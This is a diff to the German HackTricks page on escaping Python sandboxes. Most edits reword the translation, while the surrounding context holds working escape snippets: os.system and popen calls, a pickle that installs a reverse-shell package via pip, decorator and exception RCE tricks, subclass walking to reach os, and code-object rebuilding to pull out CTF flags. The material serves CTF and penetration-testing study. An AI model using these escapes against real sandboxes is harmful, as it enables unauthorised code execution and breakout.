@@ -1,25 +1,25 @@
 # Bypass Python sandboxes
 
 {% hint style="success" %}
-Lernen & üben Sie AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
-Lernen & üben Sie GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lerne & übe AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Lerne & übe GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
-* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
-* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
+* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.
 
 </details>
 {% endhint %}
 
 <figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
 
-#### Erhalten Sie die Perspektive eines Hackers auf Ihre Webanwendungen, Ihr Netzwerk und die Cloud
+**Erhalte die Perspektive eines Hackers auf deine Webanwendungen, Netzwerke und Cloud**
 
-**Finden und melden Sie kritische, ausnutzbare Schwachstellen mit echtem Geschäftsauswirkungen.** Verwenden Sie unsere 20+ benutzerdefinierten Tools, um die Angriffsfläche zu kartieren, Sicherheitsprobleme zu finden, die Ihnen ermöglichen, Berechtigungen zu eskalieren, und automatisierte Exploits zu verwenden, um wesentliche Beweise zu sammeln, die Ihre harte Arbeit in überzeugende Berichte verwandeln.
+**Finde und melde kritische, ausnutzbare Schwachstellen mit echtem Geschäftsauswirkungen.** Nutze unsere 20+ benutzerdefinierten Tools, um die Angriffsfläche zu kartieren, Sicherheitsprobleme zu finden, die dir ermöglichen, Privilegien zu eskalieren, und automatisierte Exploits zu verwenden, um wesentliche Beweise zu sammeln, die deine harte Arbeit in überzeugende Berichte verwandeln.
 
 {% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}
 
@@ -29,7 +29,7 @@ Dies sind einige Tricks, um die Python-Sandbox-Schutzmaßnahmen zu umgehen und b
 
 ## Befehlsausführungsbibliotheken
 
-Das erste, was Sie wissen müssen, ist, ob Sie Code direkt mit einer bereits importierten Bibliothek ausführen können oder ob Sie eine dieser Bibliotheken importieren könnten:
+Das erste, was du wissen musst, ist, ob du Code direkt mit einer bereits importierten Bibliothek ausführen kannst oder ob du eine dieser Bibliotheken importieren könntest:
 ```python
 os.system("ls")
 os.popen("ls").read()
@@ -76,7 +76,7 @@ Python versucht, **zuerst Bibliotheken aus dem aktuellen Verzeichnis zu laden** 
 
 ### Standardpakete
 
-Hier findest du eine **Liste der vorinstallierten** Pakete: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
+Du kannst eine **Liste der vorinstallierten** Pakete hier finden: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
 Beachte, dass du aus einem Pickle die Python-Umgebung **beliebige Bibliotheken** importieren kannst, die im System installiert sind.\
 Zum Beispiel wird der folgende Pickle, wenn er geladen wird, die Pip-Bibliothek importieren, um sie zu verwenden:
 ```python
@@ -107,13 +107,13 @@ Sie können das Paket zum Erstellen der Reverse-Shell hier herunterladen. Bitte 
 {% file src="../../../.gitbook/assets/Reverse.tar (1).gz" %}
 
 {% hint style="info" %}
-Dieses Paket heißt `Reverse`. Es wurde jedoch speziell so gestaltet, dass, wenn Sie die Reverse-Shell verlassen, der Rest der Installation fehlschlägt, sodass Sie **keine zusätzlichen Python-Pakete auf dem Server installiert lassen**, wenn Sie gehen.
+Dieses Paket heißt `Reverse`. Es wurde jedoch speziell so gestaltet, dass der Rest der Installation fehlschlägt, wenn Sie die Reverse-Shell verlassen, sodass Sie **keine zusätzlichen Python-Pakete auf dem Server installiert lassen**, wenn Sie gehen.
 {% endhint %}
 
 ## Eval-ing python code
 
 {% hint style="warning" %}
-Beachten Sie, dass exec mehrzeilige Strings und ";" erlaubt, eval jedoch nicht (überprüfen Sie den Walross-Operator).
+Beachten Sie, dass exec mehrzeilige Strings und ";" erlaubt, eval jedoch nicht (prüfen Sie den Walross-Operator).
 {% endhint %}
 
 Wenn bestimmte Zeichen verboten sind, können Sie die **Hex-/Oktal/B64**-Darstellung verwenden, um die Einschränkung zu **umgehen**:
@@ -177,7 +177,7 @@ Es ist auch möglich, es mit anderen Kodierungen zu umgehen, z.B. `raw_unicode_e
 
 ## Python-Ausführung ohne Aufrufe
 
-Wenn Sie sich in einem Python-Gefängnis befinden, das **keine Aufrufe zulässt**, gibt es dennoch einige Möglichkeiten, **willkürliche Funktionen, Code** und **Befehle** auszuführen.
+Wenn Sie sich in einem Python-Gefängnis befinden, das **keine Aufrufe zulässt**, gibt es dennoch einige Möglichkeiten, **willkürliche Funktionen, Code** und **Befehle** **auszuführen**.
 
 ### RCE mit [Dekoratoren](https://docs.python.org/3/glossary.html#term-decorator)
 ```python
@@ -276,7 +276,7 @@ Sub['import os; os.system("sh")']
 ```
 #### Erstellen von Objekten mit Ausnahmen
 
-Wenn eine **Ausnahme ausgelöst wird**, wird ein Objekt der **Exception** **erstellt**, ohne dass Sie den Konstruktor direkt aufrufen müssen (ein Trick von [**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)):
+Wenn eine **Ausnahme ausgelöst** wird, wird ein Objekt der **Exception** **erstellt**, ohne dass Sie den Konstruktor direkt aufrufen müssen (ein Trick von [**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)):
 ```python
 class RCE(Exception):
 def __init__(self):
@@ -318,7 +318,7 @@ __iadd__ = eval
 __builtins__.__import__ = X
 {}[1337]
 ```
-### Datei mit builtins Hilfe & Lizenz lesen
+### Datei mit Hilfe und Lizenz der Builtins lesen
 ```python
 __builtins__.__dict__["license"]._Printer__filenames=["flag"]
 a = __builtins__.help
@@ -430,7 +430,7 @@ class_obj.__init__.__globals__
 
 ## Entdecken von willkürlicher Ausführung
 
-Hier möchte ich erklären, wie man leicht **gefährlichere Funktionen** entdecken und zuverlässigere Exploits vorschlagen kann.
+Hier möchte ich erklären, wie man leicht **gefährlichere Funktionen** entdecken kann, die geladen sind, und zuverlässigere Exploits vorschlagen.
 
 #### Zugriff auf Unterklassen mit Bypässen
 
@@ -508,7 +508,7 @@ Wir können dasselbe mit **anderen Bibliotheken** tun, von denen wir wissen, das
 #pdb
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")
 ```
-Darüber hinaus könnten wir sogar nachsehen, welche Module bösartige Bibliotheken laden:
+Außerdem könnten wir sogar nachsehen, welche Module bösartige Bibliotheken laden:
 ```python
 bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
 for b in bad_libraries_names:
@@ -708,7 +708,7 @@ people = PeopleInfo('GEEKS', 'FORGEEKS')
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
 get_name_for_avatar(st, people_obj = people)
 ```
-Beachten Sie, wie Sie **Attribute** auf normale Weise mit einem **Punkt** wie `people_obj.__init__` und **Dictionärelemente** mit **Klammern** ohne Anführungszeichen `__globals__[CONFIG]` zugreifen können.
+Beachten Sie, wie Sie **Attribute** auf normale Weise mit einem **Punkt** wie `people_obj.__init__` und **dict-Elemente** mit **Klammern** ohne Anführungszeichen `__globals__[CONFIG]` zugreifen können.
 
 Beachten Sie auch, dass Sie `.__dict__` verwenden können, um Elemente eines Objekts aufzulisten `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`.
 
@@ -799,7 +799,7 @@ Die Herausforderung missbraucht tatsächlich eine andere Schwachstelle im Server
 Wenn du mehr über **python bytecode** erfahren möchtest, lies diesen **tollen** Beitrag zu dem Thema: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 {% endhint %}
 
-In einigen CTFs könnte dir der Name einer **benutzerdefinierten Funktion, in der das Flag** gespeichert ist, bereitgestellt werden und du musst die **Interna** der **Funktion** einsehen, um es zu extrahieren.
+In einigen CTFs könnte dir der Name einer **benutzerdefinierten Funktion, in der sich das Flag** befindet, bereitgestellt werden und du musst die **Interna** der **Funktion** einsehen, um es zu extrahieren.
 
 Dies ist die Funktion, die untersucht werden soll:
 ```python
@@ -834,7 +834,7 @@ CustomClassObject.__class__.__init__.__globals__
 
 ### **Zugriff auf den Funktionscode**
 
-**`__code__`** und `func_code`: Sie können **auf** dieses **Attribut** der Funktion **zugreifen**, um das **Code-Objekt** der Funktion **zu erhalten**.
+**`__code__`** und `func_code`: Sie können dieses **Attribut** der Funktion **zugreifen**, um das **Code-Objekt** der Funktion zu **erhalten**.
 ```python
 # In our current example
 get_flag.__code__
@@ -962,7 +962,7 @@ return "Nope"
 ```
 ### Erstellen des Code-Objekts
 
-Zunächst müssen wir wissen, **wie man ein Code-Objekt erstellt und ausführt**, damit wir eines erstellen können, um unsere Funktion zu exécutieren:
+Zuerst müssen wir wissen, **wie man ein Code-Objekt erstellt und ausführt**, damit wir eines erstellen können, um unsere Funktion leak auszuführen:
 ```python
 code_type = type((lambda: None).__code__)
 # Check the following hint if you get an error in calling this
@@ -990,10 +990,10 @@ types.CodeType.__doc__
 ```
 {% endhint %}
 
-### Wiederherstellung einer geleakten Funktion
+### Eine geleakte Funktion neu erstellen
 
 {% hint style="warning" %}
-Im folgenden Beispiel werden wir alle Daten verwenden, die benötigt werden, um die Funktion direkt aus dem Funktionscode-Objekt wiederherzustellen. In einem **echten Beispiel** sind alle **Werte**, um die Funktion **`code_type`** auszuführen, das, was **du leaken** musst.
+Im folgenden Beispiel werden wir alle Daten, die benötigt werden, um die Funktion direkt aus dem Funktionscodeobjekt neu zu erstellen, entnehmen. In einem **realen Beispiel** sind alle **Werte**, um die Funktion **`code_type`** auszuführen, das, was **du leaken** musst.
 {% endhint %}
 ```python
 fc = get_flag.__code__
@@ -1007,7 +1007,7 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 ### Bypass Defenses
 
-In den vorherigen Beispielen zu Beginn dieses Beitrags kannst du sehen, **wie man jeden Python-Code mit der `compile`-Funktion ausführt**. Das ist interessant, weil man **ganze Skripte** mit Schleifen und allem in einer **einzeiligen Anweisung** ausführen kann (und wir könnten dasselbe mit **`exec`** tun).\
+In vorherigen Beispielen zu Beginn dieses Beitrags kannst du **sehen, wie man jeden Python-Code mit der `compile`-Funktion ausführt**. Das ist interessant, weil du **ganze Skripte** mit Schleifen und allem in einer **einzeiligen Anweisung** ausführen kannst (und wir könnten dasselbe mit **`exec`** tun).\
 Wie auch immer, manchmal könnte es nützlich sein, ein **kompiliertes Objekt** auf einer lokalen Maschine zu **erstellen** und es auf der **CTF-Maschine** auszuführen (zum Beispiel, weil wir die `compiled`-Funktion in der CTF nicht haben).
 
 Zum Beispiel, lass uns manuell eine Funktion kompilieren und ausführen, die _./poc.py_ liest:
@@ -1059,7 +1059,7 @@ Mit Tools wie [**https://www.decompiler.com/**](https://www.decompiler.com) kann
 
 ### Assert
 
-Python, das mit Optimierungen mit dem Parameter `-O` ausgeführt wird, entfernt Assert-Anweisungen und jeden Code, der von dem Wert **debug** abhängt.\
+Python, das mit Optimierungen mit dem Parameter `-O` ausgeführt wird, entfernt Assert-Anweisungen und jeden Code, der von dem Wert von **debug** abhängt.\
 Daher sind Überprüfungen wie
 ```python
 def check_permission(super_user):
@@ -1069,7 +1069,7 @@ print("\nYou are a super user\n")
 except AssertionError:
 print(f"\nNot a Super User!!!\n")
 ```
-will umgangen
+wird umgangen
 
 ## Referenzen
 
@@ -1082,7 +1082,7 @@ will umgangen
 
 <figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
 
-#### Erhalten Sie die Perspektive eines Hackers auf Ihre Webanwendungen, Ihr Netzwerk und die Cloud
+**Erhalten Sie die Perspektive eines Hackers auf Ihre Webanwendungen, Ihr Netzwerk und die Cloud**
 
 **Finden und melden Sie kritische, ausnutzbare Schwachstellen mit echtem Geschäftsauswirkungen.** Verwenden Sie unsere 20+ benutzerdefinierten Tools, um die Angriffsfläche zu kartieren, Sicherheitsprobleme zu finden, die Ihnen ermöglichen, Berechtigungen zu eskalieren, und automatisierte Exploits zu verwenden, um wesentliche Beweise zu sammeln, die Ihre harte Arbeit in überzeugende Berichte verwandeln.
 
